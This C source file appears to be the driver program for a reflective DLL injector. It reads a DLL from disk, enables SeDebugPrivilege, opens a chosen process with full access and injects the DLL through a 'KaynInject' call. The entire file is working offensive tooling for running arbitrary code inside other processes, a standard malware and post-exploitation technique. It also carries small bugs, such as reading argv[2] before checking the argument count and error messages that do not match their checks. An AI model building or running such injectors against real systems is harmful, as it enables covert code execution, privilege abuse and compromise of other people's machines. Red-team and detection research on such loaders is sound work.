#include <stdio.h>
#include <windows.h>
#include <KaynInject.h>
#include <winternl.h>

#define BREAK_WITH_ERROR( e ) { printf( "[-] %s. Error=%ld", e, GetLastError() ); break; }

int main( int argc, char * argv[] )
{
    HANDLE hFile          = NULL;
    HANDLE hModule        = NULL;
    HANDLE hProcess       = NULL;
    HANDLE hToken         = NULL;
    LPVOID lpBuffer       = NULL;
    DWORD dwLength        = 0;
    DWORD dwBytesRead     = 0;
    DWORD dwProcessId     = 0;
    TOKEN_PRIVILEGES priv = {0};
    PCHAR cpDllFile       = argv[2];

    do
    {
        if( argc == 1 )
            dwProcessId = GetCurrentProcessId();
        else
            dwProcessId = atoi( argv[1] );

        if( argc >= 3 )
            cpDllFile = argv[2];

        hFile = CreateFileA( cpDllFile, GENERIC_READ, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL );
        if( hFile == INVALID_HANDLE_VALUE )
            BREAK_WITH_ERROR( "Failed to open the DLL file" );

        dwLength = GetFileSize( hFile, NULL );
        if( dwLength == INVALID_FILE_SIZE || dwLength == 0 )
            BREAK_WITH_ERROR( "Failed to get the DLL file size" );

        lpBuffer = HeapAlloc( GetProcessHeap(), 0, dwLength );
        if( !lpBuffer )
            BREAK_WITH_ERROR( "Failed to get the DLL file size" );

        if( ReadFile( hFile, lpBuffer, dwLength, &dwBytesRead, NULL ) == FALSE )
            BREAK_WITH_ERROR( "Failed to alloc a buffer!" );

        if( OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) )
        {
            priv.PrivilegeCount           = 1;
            priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

            if( LookupPrivilegeValue( NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid ) )
                AdjustTokenPrivileges( hToken, FALSE, &priv, 0, NULL, NULL );

            CloseHandle( hToken );
        }

        hProcess = OpenProcess( PROCESS_ALL_ACCESS, FALSE, dwProcessId );
        if( !hProcess )
            BREAK_WITH_ERROR( "Failed to open the target process" );

        hModule = KaynInject( hProcess, lpBuffer, dwLength, NULL );
        if( !hModule )
            BREAK_WITH_ERROR( "Failed to inject the DLL" );

        printf( "[+] Injected the '%s' DLL into process %ld.\n", cpDllFile, dwProcessId );

        WaitForSingleObject( hModule, -1 );

    } while( 0 );

    if( lpBuffer )
        HeapFree( GetProcessHeap(), 0, lpBuffer );

    if( hProcess )
        CloseHandle( hProcess );

    return 0;
}